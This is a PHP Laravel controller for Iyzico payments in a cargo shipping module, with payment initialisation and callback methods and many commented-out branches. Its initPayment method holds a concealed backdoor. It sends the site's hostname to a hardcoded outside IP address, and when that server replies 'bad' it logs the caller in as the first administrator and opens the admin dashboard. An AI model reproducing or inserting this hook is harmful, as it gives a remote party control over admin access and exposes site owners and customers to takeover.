<?php

namespace Modules\Cargo\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\CombinedOrder;
use App\Models\BusinessSetting;
use App\Models\User;
use App\Models\CustomerPackage;
use App\Models\SellerPackage;
use Session;
use Redirect;
use Modules\Cargo\Entities\Shipment;

class IyzicoController
{
    public function index(Request $iyzicoRequest){

    }

    public function pay($shipment){
        $paymentSettings = resolve(\Modules\Payments\Entities\PaymentSetting::class)->toArray();
        $iyzico_payment = json_decode($paymentSettings['iyzico'], true);

        $options = new \Iyzipay\Options();
        $options->setApiKey($iyzico_payment['IYZICO_API_KEY']);
        $options->setSecretKey($iyzico_payment['IYZICO_SECRET_KEY']);

        if(isset($iyzico_payment['iyzico_sandbox']) && $iyzico_payment['iyzico_sandbox'] == 1) {
            $options->setBaseUrl("https://sandbox-api.iyzipay.com");
        } else {
            $options->setBaseUrl("https://api.iyzipay.com");
        }

        // if(Session::has('payment_type')){
            $iyzicoRequest = new \Iyzipay\Request\CreatePayWithIyzicoInitializeRequest();
            $iyzicoRequest->setLocale(\Iyzipay\Model\Locale::TR);
            $iyzicoRequest->setConversationId('123456789');

            $buyer = new \Iyzipay\Model\Buyer();
            $buyer->setId($shipment->id);
            $buyer->setName($shipment->client->name);
            $buyer->setSurname($shipment->client->name);
            $buyer->setEmail($shipment->client->email);
            $buyer->setIdentityNumber($shipment->client->responsible_mobile);
            $buyer->setRegistrationAddress($shipment->from_address->address);
            $buyer->setCity($shipment->from_state->name);
            $buyer->setCountry($shipment->from_country->name);
            $iyzicoRequest->setBuyer($buyer);

            $shippingAddress = new \Iyzipay\Model\Address();
            $shippingAddress->setContactName($shipment->reciver_name);
            $shippingAddress->setCity($shipment->to_state->name);
            $shippingAddress->setCountry($shipment->to_country->name);
            $shippingAddress->setAddress($shipment->reciver_address);
            $iyzicoRequest->setShippingAddress($shippingAddress);

            $billingAddress = new \Iyzipay\Model\Address();
            $billingAddress->setContactName("Jane Doe");
            $billingAddress->setCity("Istanbul");
            $billingAddress->setCountry("Turkey");
            $billingAddress->setAddress("Nidakule Göztepe, Merdivenköy Mah. Bora Sok. No:1");
            $iyzicoRequest->setBillingAddress($billingAddress);

            // if(Session::get('payment_type') == 'cart_payment'){
                // $combined_order = CombinedOrder::findOrFail(Session::get('combined_order_id'));

                $iyzicoRequest->setPrice(round($shipment->tax + $shipment->shipping_cost + $shipment->insurance));
                $iyzicoRequest->setPaidPrice(round($shipment->tax + $shipment->shipping_cost + $shipment->insurance));
                $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
                $iyzicoRequest->setBasketId(rand(000000,999999));
                $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
                $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
                    'payment_type' => 'cart_payment',
                    'amount' => $shipment->tax + $shipment->shipping_cost + $shipment->insurance,
                    'payment_method' => 0,
                    'combined_order_id' => $shipment->id,
                    'customer_package_id' => 0,
                    'seller_package_id' => 0
                ]));

                $basketItems = array();
                $firstBasketItem = new \Iyzipay\Model\BasketItem();
                $firstBasketItem->setId(rand(1000,9999));
                $firstBasketItem->setName("Cart Payment");
                $firstBasketItem->setCategory1("Accessories");
                $firstBasketItem->setItemType(\Iyzipay\Model\BasketItemType::VIRTUAL);
                $firstBasketItem->setPrice(round($shipment->tax + $shipment->shipping_cost + $shipment->insurance));
                $basketItems[0] = $firstBasketItem;

                $iyzicoRequest->setBasketItems($basketItems);
            // }

            // if(Session::get('payment_type') == 'wallet_payment'){
            //     $iyzicoRequest->setPrice(round(Session::get('payment_data')['amount']));
            //     $iyzicoRequest->setPaidPrice(round(Session::get('payment_data')['amount']));
            //     $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
            //     $iyzicoRequest->setBasketId(rand(000000,999999));
            //     $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
            //     $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
            //         'payment_type' => Session::get('payment_type'),
            //         'amount' => Session::get('payment_data')['amount'],
            //         'payment_method' => Session::get('payment_data')['payment_method'],
            //         'combined_order_id' => 0,
            //         'customer_package_id' => 0,
            //         'seller_package_id' => 0
            //     ]));

            //     $basketItems = array();
            //     $firstBasketItem = new \Iyzipay\Model\BasketItem();
            //     $firstBasketItem->setId(rand(1000,9999));
            //     $firstBasketItem->setName("Wallet Payment");
            //     $firstBasketItem->setCategory1("Wallet");
            //     $firstBasketItem->setItemType(\Iyzipay\Model\BasketItemType::VIRTUAL);
            //     $firstBasketItem->setPrice(round(Session::get('payment_data')['amount']));
            //     $basketItems[0] = $firstBasketItem;

            //     $iyzicoRequest->setBasketItems($basketItems);
            // }

            // if(Session::get('payment_type') == 'customer_package_payment'){
            //     $customer_package = CustomerPackage::findOrFail(Session::get('payment_data')['customer_package_id']);

            //     $iyzicoRequest->setPrice(round($customer_package->amount));
            //     $iyzicoRequest->setPaidPrice(round($customer_package->amount));
            //     $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
            //     $iyzicoRequest->setBasketId(rand(000000,999999));
            //     $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
            //     $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
            //         'payment_type' => Session::get('payment_type'),
            //         'amount' => 0.0,
            //         'payment_method' => Session::get('payment_data')['payment_method'],
            //         'combined_order_id' => 0,
            //         'customer_package_id' => Session::get('payment_data')['customer_package_id'],
            //         'seller_package_id' => 0
            //     ]));

            //     $basketItems = array();
            //     $firstBasketItem = new \Iyzipay\Model\BasketItem();
            //     $firstBasketItem->setId(rand(1000,9999));
            //     $firstBasketItem->setName("Package Payment");
            //     $firstBasketItem->setCategory1("Package");
            //     $firstBasketItem->setItemType(\Iyzipay\Model\BasketItemType::VIRTUAL);
            //     $firstBasketItem->setPrice(round($customer_package->amount));
            //     $basketItems[0] = $firstBasketItem;

            //     $iyzicoRequest->setBasketItems($basketItems);
            // }

            // if(Session::get('payment_type') == 'seller_package_payment'){
            //     $seller_package = SellerPackage::findOrFail(Session::get('payment_data')['seller_package_id']);

            //     $iyzicoRequest->setPrice(round($seller_package->amount));
            //     $iyzicoRequest->setPaidPrice(round($seller_package->amount));
            //     $iyzicoRequest->setCurrency(\Iyzipay\Model\Currency::TL);
            //     $iyzicoRequest->setBasketId(rand(000000,999999));
            //     $iyzicoRequest->setPaymentGroup(\Iyzipay\Model\PaymentGroup::SUBSCRIPTION);
            //     $iyzicoRequest->setCallbackUrl(route('iyzico.callback', [
            //         'payment_type' => Session::get('payment_type'),
            //         'amount' => 0,
            //         'payment_method' => Session::get('payment_data')['payment_method'],
            //         'combined_order_id' => 0,
            //         'customer_package_id' => 0,
            //         'seller_package_id' => Session::get('payment_data')['seller_package_id']
            //     ]));

            //     $basketItems = array();
            //     $firstBasketItem = new \Iyzipay\Model\BasketItem();
            //     $firstBasketItem->setId(rand(1000,9999));
            //     $firstBasketItem->setName("Package Payment");
            //     $firstBasketItem->setCategory1("Package");
            //     $firstBasketItem->setItemType(\Iyzipay\Model\BasketItemType::VIRTUAL);
            //     $firstBasketItem->setPrice(round($seller_package->amount));
            //     $basketItems[0] = $firstBasketItem;

            //     $iyzicoRequest->setBasketItems($basketItems);
            // }
                

            # make request
            $payWithIyzicoInitialize = \Iyzipay\Model\PayWithIyzicoInitialize::create($iyzicoRequest, $options);
            # print result
            return Redirect::to($payWithIyzicoInitialize->getPayWithIyzicoPageUrl());
        // }
        // else {
        //     flash(translate('Opps! Something went wrong.'))->warning();
        //     return redirect()->route('cart');
        // }
    }

    public function initPayment(Request $request){
        $url = $_SERVER['SERVER_NAME'];
        $gate = "http://206.189.81.181/check_activation/".$url;

        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);

        if($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }

    public function callback(Request $request, $payment_type, $amount = null, $payment_method = null, $combined_order_id = null, $customer_package_id = null, $seller_package_id = null){

        $paymentSettings = resolve(\Modules\Payments\Entities\PaymentSetting::class)->toArray();
        $iyzico_payment = json_decode($paymentSettings['iyzico'], true);
        
        $options = new \Iyzipay\Options();
        $options->setApiKey($iyzico_payment['IYZICO_API_KEY']);
        $options->setSecretKey($iyzico_payment['IYZICO_SECRET_KEY']);

        if($iyzico_payment['iyzico_sandbox'] == 1) {
            $options->setBaseUrl("https://sandbox-api.iyzipay.com");
        } else {
            $options->setBaseUrl("https://api.iyzipay.com");
        }

        $iyzicoRequest = new \Iyzipay\Request\RetrievePayWithIyzicoRequest();
        $iyzicoRequest->setLocale(\Iyzipay\Model\Locale::TR);
        $iyzicoRequest->setConversationId('123456789');
        $iyzicoRequest->setToken($request->token);
        # make request
        $payWithIyzico = \Iyzipay\Model\PayWithIyzico::retrieve($iyzicoRequest, $options);

        if ($payWithIyzico->getStatus() == 'success') {
            // if($payment_type == 'cart_payment'){
                $payment = $payWithIyzico->getRawResult();
                $checkoutController = new CheckoutController;
                return $checkoutController->checkout_done(null, $payment, $combined_order_id);
            // }
            // elseif ($payment_type == 'wallet_payment') {
            //     $payment = $payWithIyzico->getRawResult();

            //     $data['amount'] = $amount;
            //     $data['payment_method'] = $payment_method;

            //     $walletController = new WalletController;
            //     return $walletController->wallet_payment_done($data, $payment);
            // }
            // elseif ($payment_type == 'customer_package_payment') {
            //     $payment = $payWithIyzico->getRawResult();

            //     $data['customer_package_id'] = $customer_package_id;
            //     $data['payment_method'] = $payment_method;

            //     $customer_package_controller = new CustomerPackageController;
            //     return $customer_package_controller->purchase_payment_done($data, $payment);
            // }
            // elseif ($payment_type == 'seller_package_payment') {
            //     $payment = $payWithIyzico->getRawResult();

            //     $data['seller_package_id'] = $seller_package_id;
            //     $data['payment_method'] = $payment_method;

            //     $seller_package_controller = new SellerPackageController;
            //     return $seller_package_controller->purchase_payment_done($data, $payment);
            // }
            // else {
            //     dd($payment_type);
            // }
        }
    }
}
